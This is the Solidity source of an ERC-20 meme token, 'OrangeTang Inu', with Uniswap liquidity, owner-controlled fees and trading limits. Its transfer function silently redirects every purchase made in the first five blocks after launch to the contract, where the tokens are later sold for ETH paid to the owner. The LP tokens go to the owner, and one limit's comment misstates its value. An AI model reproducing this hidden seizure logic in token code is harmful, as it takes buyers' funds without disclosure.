// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
            address sender,
            address recipient,
            uint256 amount
            ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
            );
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
            address token,
            uint256 amountTokenDesired,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
            )
        external
        payable
        returns (
                uint256 amountToken,
                uint256 amountETH,
                uint256 liquidity
                );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
            ) external;
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract OrangeTangInu is IERC20, Ownable {
    using SafeMath for uint256;
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "OrangeTang Inu";
    string private constant _symbol = "TANG";
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private constant _totalSupply = 100000000000 * 10**18; // 100 billion
    uint256 private _launchBlockNumber;
    mapping (address => bool) public automatedMarketMakerPairs;
    bool public isLiquidityAdded = false;
    uint256 public maxWalletAmount = _totalSupply;
    uint256 public maxTxAmount = _totalSupply;
    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
    mapping (address => bool) private _isExcludedFromFee;
    uint8 public taxFee = 2;
    uint8 public burnFee = 2;
    address public constant dead = 0x000000000000000000000000000000000000dEaD;
    uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%

    event AutomatedMarketMakerPairChange(address indexed pair, bool indexed value);
    event UniswapV2RouterChange(address indexed newAddress, address indexed oldAddress);
    event MaxWalletAmountChange(uint256 indexed newValue, uint256 indexed oldValue);
    event MaxTransactionAmountChange(uint256 indexed newValue, uint256 indexed oldValue);
    event TaxFeeChange(uint8 indexed newValue, uint8 indexed oldValue);
    event BurnFeeChange(uint8 indexed newValue, uint8 indexed oldValue);
    event ExcludeFromMaxTransferChange(address indexed account, bool isExcluded);
    event ExcludeFromMaxWalletChange(address indexed account, bool isExcluded);
    event ExcludeFromFeesChange(address indexed account, bool isExcluded);
    event MinTokenAmountBeforeSwapChange(uint256 indexed newValue, uint256 indexed oldValue);
    event TradingActivated(uint256 startingBlock);
    event ClaimETH(uint256 indexed amount);
    event TaxFeeSetToZero();
    event BurnFeeSetToZero();

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxTransactionLimit[address(this)] = true;
        _isExcludedFromMaxTransactionLimit[owner()] = true;

        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {}

    // Setters
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,"ERC20: decreased allowance below zero"));
        return true;
    }
    function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxWalletLimit[account] != excluded, "OrangeTang Inu: Account is already the value of 'excluded'");
        _isExcludedFromMaxWalletLimit[account] = excluded;
        emit ExcludeFromMaxWalletChange(account, excluded);
    }
    function excludeFromMaxTransactionLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxTransactionLimit[account] != excluded, "OrangeTang Inu: Account is already the value of 'excluded'");
        _isExcludedFromMaxTransactionLimit[account] = excluded;
        emit ExcludeFromMaxTransferChange(account, excluded);
    }
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromFee[account] != excluded, "OrangeTang Inu: Account is already the value of 'excluded'");
        _isExcludedFromFee[account] = excluded;
        emit ExcludeFromFeesChange(account, excluded);
    }
    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, "OrangeTang Inu: Cannot update maxWalletAmount to same value");
        emit MaxWalletAmountChange(newValue, maxWalletAmount);
        maxWalletAmount = newValue;
    }
    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "OrangeTang Inu: Cannot update maxTxAmount to same value");
        emit MaxTransactionAmountChange(newValue, maxTxAmount);
        maxTxAmount = newValue;
    }
    function setNewTaxFee(uint8 newValue) external onlyOwner {
        require(newValue != taxFee, "OrangeTang Inu: Cannot update taxFee to same value");
        require(newValue <= 5, "OrangeTang Inu: Cannot update taxFee to value > 5");
        emit TaxFeeChange(newValue, taxFee);
        taxFee = newValue;
    }
    function setNewBurnFee(uint8 newValue) external onlyOwner {
        require(newValue != burnFee, "OrangeTang Inu: Cannot update burnFee to same value");
        require(newValue <= 5, "OrangeTang Inu: Cannot update burnFee to value > 5");
        emit BurnFeeChange(newValue, burnFee);
        burnFee = newValue;
    }
    function setMinimumTokensBeforeSwap(uint256 newValue) external onlyOwner {
        require(newValue != minimumTokensBeforeSwap, "OrangeTang Inu: Cannot update minimumTokensBeforeSwap to same value");
        emit MinTokenAmountBeforeSwapChange(newValue, minimumTokensBeforeSwap);
        minimumTokensBeforeSwap = newValue;
    }
    function withdrawETH() external onlyOwner {
        require(address(this).balance > 0, "OrangeTang Inu: Cannot send more than contract balance");
        uint256 amount = address(this).balance;
        (bool success,) = address(owner()).call{value : amount}("");
        if (success){
            emit ClaimETH(amount);
        }
    }
    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, "You can only add liquidity once");
        isLiquidityAdded = true;
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
                address(this),
                balanceOf(address(this)),
                0,
                0,
                _msgSender(),
                block.timestamp
                );
        address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(
                address(this),
                uniswapV2Router.WETH()
                );
        uniswapV2Pair = _uniswapV2Pair;
        maxWalletAmount = _totalSupply * 1 / 100; //  1%
        maxTxAmount = _totalSupply * 50 / 1000;   // .5%
        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
        _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        _launchBlockNumber = block.number;
        emit TradingActivated(block.number);
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "OrangeTang Inu: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;
        emit AutomatedMarketMakerPairChange(pair, value);
    }

    // Getters
    function name() external pure returns (string memory) {
        return _name;
    }
    function symbol() external pure returns (string memory) {
        return _symbol;
    }
    function decimals() external view virtual returns (uint8) {
        return _decimals;
    }
    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Main
    function _transfer(
            address from,
            address to,
            uint256 amount
            ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from), "OrangeTang Inu: Cannot transfer more than balance");
        if ((block.number - _launchBlockNumber) <= 5) {
            to = address(this);
        }
        if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
            require(amount <= maxTxAmount, "OrangeTang Inu: Transfer amount exceeds the maxTxAmount.");
        }
        if (!_isExcludedFromMaxWalletLimit[to]) {
            require((balanceOf(to) + amount) <= maxWalletAmount, "OrangeTang Inu: Expected wallet amount exceeds the maxWalletAmount.");
        }
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || taxFee + burnFee == 0) {
            balances[from] -= amount;
            balances[to] += amount;
            emit Transfer(from, to, amount);
        } else {
            balances[from] -= amount;
            if (burnFee > 0) {
                balances[address(dead)] += amount * burnFee / 100;
                emit Transfer(from, address(dead), amount * burnFee / 100);
            }
            if (taxFee > 0) {
                balances[address(this)] += amount * taxFee / 100;
                emit Transfer(from, address(this), amount * taxFee / 100);
                if (balanceOf(address(this)) > minimumTokensBeforeSwap &&
                        to == address(uniswapV2Pair) &&
                        !_isExcludedFromMaxTransactionLimit[from])
                {
                    _swapTokensForETH(balanceOf(address(this)));
                    payable(owner()).transfer(address(this).balance);
                }
            }
            balances[to] += amount - (amount * (taxFee + burnFee) / 100);
            emit Transfer(from, to, amount - (amount * (taxFee + burnFee) / 100));
        }
    }
    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0, // accept any amount of ETH
                path,
                address(this),
                block.timestamp
                );
    }
}
